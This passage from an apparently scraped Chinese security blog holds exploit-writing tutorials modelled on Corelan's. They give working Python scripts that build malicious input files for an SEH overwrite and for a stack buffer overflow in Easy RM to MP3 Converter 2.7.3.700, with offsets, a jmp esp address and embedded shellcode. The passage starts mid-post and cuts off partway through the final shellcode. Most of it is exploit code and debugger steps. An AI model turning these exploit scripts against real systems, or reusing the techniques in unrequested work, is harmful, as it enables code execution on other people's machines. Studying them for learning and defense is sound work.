seh:”\\xeb\\x06\\x90\\x90”</p>\n<p>seh:”\\x26\\x80\\x45\\x00”</p>\n<p>shellcode：完成功能的，随便找了一个弹计算器的</p>\n<p>并且在最后加了一些垃圾数据<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div></pre></td><td class=\"code\"><pre><div class=\"line\">filename = \"ui.txt\"</div><div class=\"line\">junk = \"A\" * 584</div><div class=\"line\">nseh = \"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>06<span class=\"symbol\">\\x</span>90<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">seh = \"<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>dd<span class=\"symbol\">\\x</span>01<span class=\"symbol\">\\x</span>10\"</div><div class=\"line\">shellcode = (\"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>59<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>05<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>f8<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>49\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>51<span class=\"symbol\">\\x</span>5a<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>36<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>34<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>36\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>34\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>51<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>41\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>34<span class=\"symbol\">\\x</span>5a<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4d<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>44\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>37\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>47<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>35<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>34<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>39<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4c\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>37<span class=\"symbol\">\\x</span>47<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>4d<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>44<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>4e\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>35<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>47<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>35<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>54\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>55<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>43\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>57\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>37<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>51<span class=\"symbol\">\\x</span>4d<span class=\"symbol\">\\x</span>4a\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4b\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>35<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>53\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>4b<span class=\"symbol\">\\x</span>37\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>35<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>48<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>49\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4c<span class=\"symbol\">\\x</span>58<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>47<span class=\"symbol\">\\x</span>45<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>4f<span class=\"symbol\">\\x</span>47<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>36<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>46\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>36<span class=\"symbol\">\\x</span>43<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>42<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>5a\")</div><div class=\"line\">junk2=\"<span class=\"symbol\">\\x</span>90\" * 1000;</div><div class=\"line\">data = junk + nseh + seh + shellcode + junk2</div><div class=\"line\">f = open(filename,'w')</div><div class=\"line\">f.write(data)</div><div class=\"line\">f.close()</div></pre></td></tr></table></figure></p>\n<p>运行目标程序，OK！！！！计算器成功弹出来了</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez1igyvjt5j30es08gtb2.jpg\" alt=\"\"></p>\n<h1 id=\"Ⅵ、参考文献\"><a href=\"#Ⅵ、参考文献\" class=\"headerlink\" title=\"Ⅵ、参考文献\"></a>Ⅵ、参考文献</h1><p><a href=\"exploit编写笔记2——基于SEH的exploit\">exploit编写笔记2——基于SEH的exploit</a><br><a href=\"https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/\" target=\"_blank\" rel=\"external\">https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/</a></p>\n"},{"title":"exploit编写教程1：基于栈的溢出","url":"http://huirong.github.io/2015/12/15/stack-based-overflow/","content":"<p>一直都想系统学习exploit编写，最近找到个不错的网站<a href=\"https://www.corelan.be/\" target=\"_blank\" rel=\"external\">Corelan Team</a>,准备按照上面的教程学习，这是第一篇古老的buffer overflow<br><a id=\"more\"></a></p>\n<h1 id=\"Ⅰ、试验环境\"><a href=\"#Ⅰ、试验环境\" class=\"headerlink\" title=\"Ⅰ、试验环境\"></a>Ⅰ、试验环境</h1><ul>\n<li>测试平台： Microsoft Windows XP SP3</li>\n<li>漏洞软件：Easy RM to MP3 Converter（版本2.7.3.700）</li>\n<li>分析工具：Immunity Debugger</li>\n<li>漏洞描述：通过创建一个恶意的.m3u文件将触发Easy RM to MP3 Converter (version 2.7.3.700)缓冲区溢出利用。</li>\n</ul>\n<h1 id=\"Ⅱ、漏洞触发\"><a href=\"#Ⅱ、漏洞触发\" class=\"headerlink\" title=\"Ⅱ、漏洞触发\"></a>Ⅱ、漏洞触发</h1><p>我选用Python语言编写脚本，首先构造一个30000个字符的.m3u文件，前面25000全为’A’，后5000个为’B’。<br><figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\">filename = <span class=\"string\">\"test.m3u\"</span></div><div class=\"line\">f = open(filename,<span class=\"string\">'w'</span>)</div><div class=\"line\">data = <span class=\"string\">'A'</span> * <span class=\"number\">25000</span> + <span class=\"string\">'B'</span> * <span class=\"number\">5000</span></div><div class=\"line\">f.write(data)</div><div class=\"line\">f.close()</div></pre></td></tr></table></figure></p>\n<p>使用Easy RM to MP3 Converter加载这个crash.m3u文件，出错，信息如下：</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez0oss5wf7j30e5050759.jpg\" alt=\"\"></p>\n<p>从上图可知，溢出之后的返回地址是0x42424242，也就是’BBBB’，这说明要覆盖的EIP在25000到30000之间。下面使用Immunity的查件mona来进行精确定位。</p>\n<h1 id=\"Ⅲ、EIP定位\"><a href=\"#Ⅲ、EIP定位\" class=\"headerlink\" title=\"Ⅲ、EIP定位\"></a>Ⅲ、EIP定位</h1><p>使用Immunity Debugger -&gt; open -&gt; RM2MP3Converter.exe ，F9运行，然后点击load -&gt; test.m3u<br>回到Immunity Debugger，创建包含5000个字符的pattern<br>在命令行输入：<br><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"addition\">!mona pattern_create 5000</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1ez0oyoodoej30i00dd0wn.jpg\" alt=\"\"></p>\n<p>从Log data中可知，pattern文件在C:\\D\\mona-master\\output\\RM2MP3Converter\\pattern.txt，<br>提取出生成的5000个字符文件，放入p.txt，并替换crash.m3u中最后5000个字符。脚本如下：<br><figure class=\"highlight tcl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"keyword\">filename</span> = <span class=\"string\">\"test_pattern.m3u\"</span></div><div class=\"line\">f = <span class=\"keyword\">open</span>(<span class=\"keyword\">filename</span>,<span class=\"string\">'w'</span>)</div><div class=\"line\">data = <span class=\"string\">'A'</span> * <span class=\"number\">25000</span></div><div class=\"line\">\t</div><div class=\"line\">fp = <span class=\"keyword\">open</span>(<span class=\"string\">\"p.txt\"</span>,<span class=\"string\">'r'</span>)</div><div class=\"line\">data += fp.<span class=\"keyword\">read</span>()</div><div class=\"line\">f.write(data)</div><div class=\"line\">f.<span class=\"keyword\">close</span>()</div></pre></td></tr></table></figure></p>\n<p>再次打开目标软件加载test_pattern.m3u，程序崩溃：</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p2ebjfwj30e6040q3n.jpg\" alt=\"\"></p>\n<p>此时EIP为：386b4237<br>在命令行输入：<br><figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">!mona pattern_offset <span class=\"number\">386b4237</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1ez0p476wlpj30mm0cp0wk.jpg\" alt=\"\"></p>\n<p>我们看到EIP被修改的位置是25000 + 1103。<br>此时我们再用如下脚本测试一下位置是否正确：<br><figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\">filename = <span class=\"string\">\"test.m3u\"</span></div><div class=\"line\">f = open(filename,<span class=\"string\">'w'</span>)</div><div class=\"line\">data = <span class=\"string\">'A'</span> * <span class=\"number\">26103</span> + <span class=\"string\">'B'</span> * <span class=\"number\">4</span> + <span class=\"string\">'C'</span>*<span class=\"number\">100</span></div><div class=\"line\">f.write(data)</div><div class=\"line\">f.close()</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez0p83itkrj30e503ymxw.jpg\" alt=\"\"></p>\n<p>我们可以看到，EIP现在是4个B，偏移正确，下面就是如何修改 EIP</p>\n<h1 id=\"Ⅳ、寻找shellcode存放的地址空间\"><a href=\"#Ⅳ、寻找shellcode存放的地址空间\" class=\"headerlink\" title=\"Ⅳ、寻找shellcode存放的地址空间\"></a>Ⅳ、寻找shellcode存放的地址空间</h1><p>再次使用上面.m3u文件，崩溃时，打开栈的窗口</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1ez0pbcdfiqj30ap0cfdhq.jpg\" alt=\"\"></p>\n<p>我们看到在ESP此时为000FF730，EIP到这里还有4个字节。ESP开始用于存放shellcode。</p>\n<h1 id=\"V、查找jmp-esp地址\"><a href=\"#V、查找jmp-esp地址\" class=\"headerlink\" title=\"V、查找jmp esp地址\"></a>V、查找jmp esp地址</h1><p>再次加载目标程序，F9之后Pause，在CPU窗口，右键 Search For -&gt;All commands in All modules，在之后的窗口输入jmp esp。</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1ez0pcw5iv0j30mx03uabs.jpg\" alt=\"\"></p>\n<p>选一个7C874413（地址随便选，没有影响）。</p>\n<h1 id=\"Ⅵ、构造最终的输入文件\"><a href=\"#Ⅵ、构造最终的输入文件\" class=\"headerlink\" title=\"Ⅵ、构造最终的输入文件\"></a>Ⅵ、构造最终的输入文件</h1><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/python</div><div class=\"line\">shellcode = (\"<span class=\"symbol\">\\x</span>FC<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>D2<span class=\"symbol\">\\x</span>B2<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>64<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>5A<span class=\"symbol\">\\x</span>8B\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>0C<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>14<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>28<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>C9\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>B1<span class=\"symbol\">\\x</span>18<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>C0<span class=\"symbol\">\\x</span>AC<span class=\"symbol\">\\x</span>3C<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>7C\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>02<span class=\"symbol\">\\x</span>2C<span class=\"symbol\">\\x</span>20<span class=\"symbol\">\\x</span>C1<span class=\"symbol\">\\x</span>CF<span class=\"symbol\">\\x</span>0D<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>F8<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>F0\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>5B<span class=\"symbol\">\\x</span>BC<span class=\"symbol\">\\x</span>4A<span class=\"symbol\">\\x</span>6A<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>5A<span class=\"symbol\">\\x</span>10<span class=\"symbol\">\\x</span>8B\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>12<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>DA<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>3C<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>D3<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>72\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>34<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>78<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>D3<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>20<span class=\"symbol\">\\x</span>03\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>F3<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>C9<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>AD<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>C3<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>38<span class=\"symbol\">\\x</span>47\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>74<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>F4<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>78<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>6F\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>63<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>EB<span class=\"symbol\">\\x</span>81<span class=\"symbol\">\\x</span>78<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>64<span class=\"symbol\">\\x</span>64<span class=\"symbol\">\\x</span>72\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>65<span class=\"symbol\">\\x</span>75<span class=\"symbol\">\\x</span>E2<span class=\"symbol\">\\x</span>49<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>24<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>F3<span class=\"symbol\">\\x</span>66\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>0C<span class=\"symbol\">\\x</span>4E<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>1C<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>F3<span class=\"symbol\">\\x</span>8B<span class=\"symbol\">\\x</span>14\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>8E<span class=\"symbol\">\\x</span>03<span class=\"symbol\">\\x</span>D3<span class=\"symbol\">\\x</span>52<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>57<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>72\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>79<span class=\"symbol\">\\x</span>41<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>4C<span class=\"symbol\">\\x</span>69<span class=\"symbol\">\\x</span>62<span class=\"symbol\">\\x</span>72<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>4C<span class=\"symbol\">\\x</span>6F\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>61<span class=\"symbol\">\\x</span>64<span class=\"symbol\">\\x</span>54<span class=\"symbol\">\\x</span>53<span class=\"symbol\">\\x</span>FF<span class=\"symbol\">\\x</span>D2<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>33<span class=\"symbol\">\\x</span>32<span class=\"symbol\">\\x</span>01\"</div><div class=\"line\">\"<span class=\"symbol\">\\x</span>01<span 